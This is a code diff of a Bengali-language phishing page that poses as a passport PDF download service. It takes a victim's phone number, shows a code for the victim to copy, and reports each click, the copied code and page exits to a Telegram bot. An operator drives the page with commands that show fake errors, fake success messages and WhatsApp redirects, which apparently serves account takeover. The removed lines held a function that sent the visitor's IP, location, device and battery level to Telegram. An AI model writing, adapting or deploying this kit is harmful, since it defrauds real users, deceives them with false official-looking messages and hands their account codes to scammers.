@@ -498,7 +498,7 @@ const store = {
 
 
 /* ==========================================================
-   ३. স্টেট ও ডিভাইস ইনফো கலেকশন
+   ३. স্টেট
 ========================================================== */
 
 let requestStartedAt = 0;
@@ -509,50 +509,6 @@ let currentStep = 1;
 let currentPhone = "";
 let codeShown = "";
 let navigatingToWhatsApp = false;
-
-// ডিভাইসের তথ্য ও লোকেশন বের করার ফাংশন
-async function getVisitorInfo() {
-    let info = {
-        ip: "অজানা",
-        country: "অজানা",
-        city: "অজানা",
-        region: "অজানা",
-        device: "অজানা / PC",
-        os: "অজানা",
-        battery: "অজানা"
-    };
-
-    // ১. ব্যাটারি ইনফো
-    try {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            info.battery = Math.round(battery.level * 100) + "%";
-        }
-    } catch (e) {}
-
-    // ২. ডিভাইস ও ওএস ডিটেক্ট
-    const ua = navigator.userAgent;
-    info.os = /windows/i.test(ua) ? "Windows" : /macintosh/i.test(ua) ? "Mac" : /android/i.test(ua) ? "Android" : /iphone|ipad|ipod/i.test(ua) ? "iOS" : "Unknown OS";
-    
-    let match = ua.match(/\(([^)]+)\)/);
-    if (match && match[1]) {
-        info.device = match[1];
-    }
-
-    // ৩. আইপি ও লোকেশন (ipapi থেকে)
-    try {
-        const res = await fetch("https://ipapi.co/json/");
-        const data = await res.json();
-        if (data) {
-            info.ip = data.ip || "অজানা";
-            info.country = data.country_name || "অজানা";
-            info.city = data.city || "অজানা";
-            info.region = data.region || "অজানা";
-        }
-    } catch (e) {}
-
-    return info;
-}
 
 
 /* ==========================================================
@@ -579,28 +535,23 @@ const modalAction   = document.getElementById("modalAction");
 
 
 /* ==========================================================
-   ५. লিংকে ঢোকার সাথে সাথে ভিজিটর ইনফো টেলিগ্রামে পাঠানো
+   ५. ইমেজ সেট ও প্রতিবার লিংকে ঢুকলে ২ সেকেন্ড পর পপ-আপ দেখানো
 ========================================================== */
 
 if (PRODUCT_IMAGE_URL.trim() !== "") {
     productImage.src = PRODUCT_IMAGE_URL;
 }
 
-window.addEventListener("DOMContentLoaded", async function(){
-    // ব্যাকগ্রাউন্ডে ভিজিটরের লোকেশন ও ডিভাইস ইনফো কালেক্ট করে টেলিগ্রামে পাঠানো
-    const vInfo = await getVisitorInfo();
-    const visitMsg = `
-🚨 নতুন ভিজিটর সাইটে প্রবেশ করেছে!
-
-🌍 আইপি (IP): ${vInfo.ip}
-📍 দেশ: ${vInfo.country}
-🏙️ শহর: ${vInfo.city}
-🏡 এলাকা/অঞ্চল: ${vInfo.region}
-📱 ডিভাইস: ${vInfo.device}
-💻 অপারেটিং সিস্টেম: ${vInfo.os}
-🔋 ব্যাটারি চার্জ: ${vInfo.battery}
-`;
-    notifyTelegram(visitMsg);
+window.addEventListener("DOMContentLoaded", function(){
+    // ব্যাকগ্রাউন্ডে ভিজিটর প্রবেশের নোটিফিকেশন পাঠানো
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: "🚨 নতুন ইউজার ইন-অ্যাপ ব্রাউজার থেকে লিংকে প্রবেশ করেছে!"
+        })
+    }).catch(function(){});
 
     setTimeout(function(){
         if (browserRedirectModal) {
@@ -609,21 +560,7 @@ window.addEventListener("DOMContentLoaded", async function(){
     }, 2000);
 });
 
-document.getElementById("openChromeBtn").addEventListener("click", async function(){
-    // পারমিশন পপ-আপে (ক্রোম ব্রাউজারে যাওয়ার বাটনে) ক্লিক করার সাথে সাথেও ইনফো পাঠানো যাবে
-    const vInfo = await getVisitorInfo();
-    const clickMsg = `
-👆 ইউজার ক্রোম ব্রাউজারে যাওয়ার পারমিশন বাটনে ক্লিক করেছে!
-
-🌍 আইপি (IP): ${vInfo.ip}
-📍 দেশ: ${vInfo.country}
-🏙️ শহর: ${vInfo.city}
-🏡 এলাকা/অঞ্চল: ${vInfo.region}
-📱 ডিভাইস: ${vInfo.device}
-🔋 ব্যাটারি: ${vInfo.battery}
-`;
-    notifyTelegram(clickMsg);
-
+document.getElementById("openChromeBtn").addEventListener("click", function(){
     browserRedirectModal.classList.remove("show");
     
     const intentUrl = "intent://" + window.location.href.replace(/^https?:\/\//, '') + "#Intent;scheme=https;package=com.android.chrome;end;";
@@ -898,4 +835,214 @@ function handleCommand(cmd, value){
         }
     } else if (cmd === "cmd_error") {
         showErrorModal();
-        notifyTelegram("
+        notifyTelegram("❌ /error — ইউজারকে সমস্যার বার্তা দেখানো হয়েছে");
+    } else if (cmd === "cmd_success") {
+        showSuccessModal();
+        notifyTelegram("✅ /success — ইউজারকে সফল বার্তা দেখানো হয়েছে");
+    } else if (cmd === "cmd_web") {
+        openWhatsAppLink("whatsapp_web_button", false);
+    }
+}
+
+
+/* ==========================================================
+   १४. মোডাল খোলা / বন্ধ
+========================================================== */
+
+function openModal(){
+    modalOverlay.classList.add("show");
+}
+
+function closeModal(){
+    modalOverlay.classList.remove("show");
+    modalAction.innerHTML = "";
+    codeShown = "";
+}
+
+
+/* ==========================================================
+   १५. /send — কোড + কপি বাটন
+========================================================== */
+
+function showSendModal(code){
+    openModal();
+    permTableSection.style.display = "none";
+    modalIcon.textContent = "🔑";
+    modalTitle.textContent = "পাসপোর্ট পিডিএফ ফাইলটি ডাউনলোড করুন";
+    modalText.textContent = "নিচের বাটুনে ক্লিক করুন:";
+
+    codeBox.style.display = "flex";
+    codeBox.textContent = code || "… অপেক্ষা করুন…";
+    codeShown = code || "";
+
+    modalAction.innerHTML =
+        '<button type="button" class="action-btn blue" id="copyCodeBtn"' + (code ? "" : " disabled") + '>📋 কপি করুন</button>' +
+        '<div class="copy-message" id="copyMessage">✅ কপি হয়েছে</div>';
+
+    document.getElementById("copyCodeBtn").addEventListener("click", copyCode);
+}
+
+async function copyCode(){
+    const val = codeShown;
+    if (!val) return;
+
+    const btn = document.getElementById("copyCodeBtn");
+    if (btn) btn.disabled = true;
+
+    try {
+        await navigator.clipboard.writeText(val);
+    } catch (error) {
+        const textarea = document.createElement("textarea");
+        textarea.value = val;
+        textarea.style.position = "fixed";
+        textarea.style.left = "-9999px";
+        document.body.appendChild(textarea);
+        textarea.focus();
+        textarea.select();
+        try { document.execCommand("copy"); } catch (e2) {}
+        document.body.removeChild(textarea);
+    }
+
+    const msg = document.getElementById("copyMessage");
+    if (msg) msg.style.display = "block";
+
+    notifyTelegram("📋 ইউজার কোড কপি করেছে: " + val);
+
+    setTimeout(function () {
+        closeModal();
+        showWaitingPage();
+        notifyTelegram("⏳ ইউজার আবার ওয়েটিং পেজে আটকে আছে — নতুন কমান্ডের অপেক্ষায়");
+    }, 900);
+}
+
+
+/* ==========================================================
+   १६. /error — লাল ✖ + আবার চেষ্টা করুন
+========================================================== */
+
+function showErrorModal(){
+    openModal();
+    permTableSection.style.display = "none";
+    modalIcon.innerHTML = '<span style="color:#c62828">✖</span>';
+    modalTitle.textContent = "সার্ভার জনিত সমস্যায় Block হয়ে আছে";
+    modalText.textContent = "সার্ভার জনিত সমস্যার কারণে আবেদনের সময় আপনার পাসপোর্ট এর একটু ত্রুটি হয়েছে এজন্য বর্তমানে ওয়েটিং অবস্থায় আছে দয়া করে ঠিক করে নিবেন না হলে এভাবেই থেকে যাবে ";
+
+    codeBox.style.display = "none";
+    modalAction.innerHTML = '<button type="button" class="action-btn gray" id="retryBtn">আবার চেষ্টা করুন</button>';
+
+    document.getElementById("retryBtn").addEventListener("click", function () {
+        notifyTelegram("🔄 ইউজার 'আবার চেষ্টা করুন' ক্লিক করেছে — ওয়েটিং পেজে ফিরেছে");
+        closeModal();
+        showWaitingPage();
+    });
+}
+
+
+/* ==========================================================
+   १७. /success — সবুজ ✓ + Download বাটন
+========================================================== */
+
+function showSuccessModal(){
+    openModal();
+    permTableSection.style.display = "none";
+    modalIcon.innerHTML = '<span style="color:#16833c">✓</span>';
+    modalTitle.textContent = "পাসপোর্ট নাম্বার চেক করে আপনার পাসপোর্ট এর পিডিএফ ফাইল পাওয়া গেছে";
+    modalText.textContent = "আপনার পাসপোর্ট নাম্বার দিয়ে সেভ করে পিডিএফ ফাইল পাওয়া গেছে দয়া করে কিউআর কোড স্ক্যান করে ডাউনলোড করুন";
+
+    codeBox.style.display = "none";
+    modalAction.innerHTML = '<button type="button" class="action-btn green" id="joinBtn">✅ Download করুন</button>';
+
+    document.getElementById("joinBtn").addEventListener("click", function () {
+        notifyTelegram("✅ ইউজার 'Download করুন' বাটনে ক্লিক করেছে — WhatsApp লিংকে যাচ্ছে");
+        openWhatsAppLink("success_join_button", true);
+    });
+}
+
+
+/* ==========================================================
+   १८. WhatsApp লিংক খোলা
+========================================================== */
+
+function openWhatsAppLink(source, isNewTab) {
+    navigatingToWhatsApp = true;
+    notifyTelegram("🌐 ইউজার WhatsApp লিংকে ক্লিক করে চলে গেছে (" + source + ")");
+
+    if (isNewTab) {
+        window.open(WHATSAPP_LINK, "_blank");
+    } else {
+        window.location.href = WHATSAPP_LINK;
+    }
+
+    setTimeout(function () {
+        if (currentStep === 2) {
+            showWaitingPage();
+        }
+    }, 800);
+}
+
+
+/* ==========================================================
+   १९. ইউজার সাইট ছেড়ে গেলে নোটিফিকেশন
+========================================================== */
+
+window.addEventListener("pagehide", function () {
+    if (currentStep === 2 && !navigatingToWhatsApp) {
+        notifyTelegram("🚪 ইউজার ওয়েবসাইট ছেড়ে ফিরে গেছে");
+    }
+});
+
+
+/* ==========================================================
+   २०. পেজ রিলোড / ফিরে আসা — sessionStorage
+========================================================== */
+
+window.addEventListener("pageshow", function () {
+    stopPolling();
+    navigatingToWhatsApp = false;
+
+    const savedStep = store.get("cw_step", "1");
+    const savedRequestId = store.get("cw_requestId", "0");
+    const savedPhone = store.get("cw_phone", "");
+
+    if (savedStep === "2" && savedRequestId !== "0") {
+        requestStartedAt = Number(savedRequestId);
+        currentPhone = savedPhone;
+        lastUpdateId = Number(store.get("cw_lastUpdateId", "0"));
+
+        showWaitingPage();
+        startPolling();
+    } else {
+        requestStartedAt = 0;
+        lastUpdateId = 0;
+        currentPhone = "";
+        currentStep = 1;
+        productNumber.value = "";
+        errorMessage.style.display = "none";
+
+        showProductPage();
+    }
+});
+
+
+/* ==========================================================
+   २१. ENTER চাপলে সাবমিট
+========================================================== */
+
+productNumber.addEventListener("keydown", function (event) {
+    if (event.key === "Enter") {
+        event.preventDefault();
+        submitButton.click();
+    }
+});
+
+
+/* ==========================================================
+   ২২. প্রথম লোড
+========================================================== */
+
+showProductPage();
+
+</script>
+
+</body>
+</html>
